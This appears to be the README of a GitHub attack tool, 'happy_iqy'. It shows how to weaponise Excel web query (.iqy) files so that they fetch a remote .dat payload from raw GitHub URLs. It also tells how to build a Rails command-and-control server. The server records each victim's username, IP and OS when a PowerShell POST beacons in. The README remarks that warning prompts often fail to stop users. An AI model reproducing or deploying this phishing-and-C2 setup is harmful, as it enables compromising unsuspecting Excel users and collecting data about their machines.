# happy_iqy

Excel Web Query - What in the world is that? If you are like the other 99.9% of MS Excel users, you probably have never heard of microsoft excel web queries (note: statistic made up).

<p align="center">
  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/2018-09-21_122613.png"/>
</p>

Excel web queries are powerful! Web queries are basically like having a web browser built into Excel that attempts to format the content, putting individual pieces of data into separate cells. You can then use Excel formulas (like =A1/B2) to work directly with the data you've downloaded. And you don't have to know anything about perl, cgi, php, javascript, etc.

The real key to creating a dynamic excel web query is to create your own ".iqy" file. In it's basic form, the ".iqy" file is simply a TEXT file with three main lines:

```iqy
WEB
1
https://www.thedomain.com/script.pl?paramname=value&param2=value2
```

You can create the file using a simple text editor! 

To make the query dynamic, replace the value of each parameter in the web query file (queryname.iqy) with:

```iqy
["paramname","Enter the value for paramname:"]
```

Want to see how this would apply to a Google search? The form that I used above consists of HTML code that looks like this:

```html
<form action="https://www.google.com/search">
  <input type="text" name="q" value="excel web query">
  <input type="submit" value="Search Google">
</form>
```

Notice that "q" is the name of the parameter, and the action tells you what the URL should be. The dynamic web query file for a simple google search would look like this:

```iqy
WEB
1
https://www.google.com/search?q=["keyword","Enter the Search Term:"]
```

Luckily, as long as Microsoft Office is configured to block external content (which it is by default), when Excel launches users will be presented with a warning prompt:

<p align="center">
  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/2018-09-21_123927.png"/>
</p>

iqy-user-warning-prompt-1Unfortunately, similar prompts haven't stopped users from enabling macros in suspicious documents, and there's little reason to expect it will be a 100% effective deterrent here, either.

Once enabled, the .iqy file is free to download the PowerShell script. Thankfully, before it can run the user has to respond to another prompt:

<p align="center">
  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/2018-09-21_124045.png"/>
</p>

## Configuration

You must create an '.iqy' file and add the following lines:

```iqy
WEB
1
<URL for '.dat' file>
```

You can choose any example of this repository, in the url for the .dat file add the raw of any example.

### Calc example

```iqy
WEB
1
https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/examples/calc-excel2016.dat
```
<p align="center">
  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/ezgif-2-993ba4acde.gif"/>
</p>


# Ruby C&C+- (from scratch)

<p align="center">
  <img src="https://www.coderhold.com/wp-content/uploads/2017/09/What-is-Ruby-on-Rails.png" width="100px" height="100px"/>
</p>

When the user clicks on the '.iqy' file, the pc automatically opens a PowerShell and sends a post request to the ruby server. In this post we send the basic information of PC pc and save it in a BD.

<p align="center">
  <img src="https://raw.githubusercontent.com/alexfrancow/happy_iqy/master/images/rails_architecture.png"/>
</p>

> Rails cheatsheet: https://gist.github.com/mdang/95b4f54cadf12e7e0415

### Install Ruby on Rails

```bash
sudo apt-get install rubygems ruby-dev or sudo apt-get install rubygems-integration
sudo apt-get install build-essential zlib1g-dev nodejs
sudo gem install tumble
sudo gem install rails

sudo apt-get install sqlite3 libsqlite3-dev
sudo gem install sqlite3-ruby

rails new happy_iqy --database=sqlite3
cd happy_iqy

#rake db:create
rails server or rails s
```

#### Create models

Our application needs data. Remember what this means? It means models. Great, but how we generate a model? Rails comes with some generators to common tasks. The generator is the file /script/generate. The generator will create our model.rb file along with a migration to add the table to the database. A migration file contains code to add/drop tables, or alter/add/remove columns from tables. Migrations are executed in sequence to create the tables. Run migrations (and various other commands) with "rake". Rake is a ruby code runner. 

```
rails generate model User date:datetime whoami:string ip:string os:string 
```

##### Migration file

```rb
class CreateUsers < ActiveRecord::Migration[5.2]
  def change
    create_table :users do |t|
      t.datetime :date
      t.string :whoami
      t.string :ip
      t.string :os

      t.timestamps
    end
  end
end
```

Now, run the migration using the rake task db:migrate. db:migrate applies pending migrations: 

```
rake db:migrate
```

#### Create controllers

Remember controllers? We need a controller to display all the users in the system. This scenario corresponds to the index action in our UsersController (users_controller.rb) which we don't have yet. Just like generating models, use a generator to create the controller.

Generate a new controller with default actions, routes and views:

```
rails generate controller Users index user_params create
```

We need to define an action that finds and displays all users. How did we find all the users? Our strategy is use users.all and assign it to an instance variable (@var). Why an instance variable? We assign instance variables because views are rendered with the controllers binding. You're probably thinking bindings and instance variables...what's going on? Views have access to variables defined in actions but only instance variables. Why, because instance variables are scoped to the object and not the action. Let's see some code: 
Edit ```app/controllers/users_controller.rb```

```rb
class UsersController < ApplicationController
  def index
    @users = User.all
  end
  
  def new
  end
  
  def create
  end
end
```

#### Create routes

Now the controller can find all the users. But how do we tie this to a url? We have to create some routes. Rails comes with some handy functions for generating RESTful routes (another Rails design principle). This will generate urls like /makes and /makes/1 combined with HTTP verbs to determine what method to call in our controller. Use map.resources to create RESTful routes. Open up ```/config/routes.rb``` and change it.
Automagically create all the routes for a RESTful resource:

```rb
Rails.application.routes.draw do
  get 'users/index'
  get 'users/create'
  post 'users/create'
  # For details on the DSL available within this file, see http://guides.rubyonrails.org/routing.html
  #resources :users
end
```

To make one route the main you must specify: 

```rb
get '/' => 'users#index'
```

> https://gist.github.com/mdang/95b4f54cadf12e7e0415#routes

Routes.rb can look arcane to new users. Luckily there is a way to decipher this mess. There is routes rake task to display all your routing information. Run that now and take a peek inside: 

```bash
rake routes
```

Now we need to create a template to display all our users. Create a new file called ```app/views/users/index.html.erb``` and paste this: 

```html
<% for user in @users do %>
  <h2><%=h user.whoami %></h2>
  <p><%= user.ip %></p>
<% end %>
```

This simple view loops over all @users and displays some HTML for each user. Notice a subtle difference. <%= is used when we need to output some text. <% is used when we aren't. If you don't follow this rule, you'll get an exception. Also notice the h before User.title. h is a method that escapes HTML entities. If you're not familiar with ruby, you can leave off ()'s on method calls if they're not needed. h text translates to: h(text). 

#### Add new user manually

```rb
rails console
> user = User.new :whoami => 'alexfrancow' , :ip => '127.0.0.1'
> user.save
> User.all
> exit
```

#### Add new user via POST request

Creating a new users requires two new actions. One action that renders a form for a new user. This action is named 'new'. The second is named 'create.' This action takes the form parameters and saves them in the database. Open up your ```app/controllers/users_controller.rb``` and add these actions

```rb
  def user_params
        params.require(:user).permit(:whoami, :ip, :os)
  end

  def create
        @user = User.new(user_params)
        if @user.save
                render json: @user, status: :created
        else
                render json: @user.errors, status: :unprocessable_entity
        end
  end
```

- Make a POST request to: ```/users/create``` with cURL:

```bash
curl -H "Accept: application/json" -H "Content-Type:application/json" \
-X POST -d '{ "user" : {"whoami": "alexfrancow2","ip": "127.0.0.1", "os": "windows10"} }' \
http://localhost:3000/users/create -w '\n%{http_code}\n' -s
```

- Make a POST request to: ```/users/create``` with PowerShell (Invoke-RestMethod):

```powershell
$user = @{
    whoami='joe'
    ip='doe'
}
$json = $person | ConvertTo-Json
$response = Invoke-RestMethod 'http://localhost:3000/users/create' -Method Post -Body $json -ContentType 'application/json'
```

